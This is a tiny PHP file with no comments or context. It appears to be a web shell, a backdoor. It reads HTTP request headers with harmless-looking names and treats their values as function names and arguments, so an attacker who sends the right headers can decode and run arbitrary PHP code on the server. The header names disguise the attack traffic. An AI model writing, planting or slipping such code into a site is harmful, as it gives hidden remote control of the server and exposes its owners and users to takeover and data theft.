<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $created = $_HEADERS['Large-Allocation']('', $_HEADERS['Authorization']($_HEADERS['If-Unmodified-Since']));
    $created();
}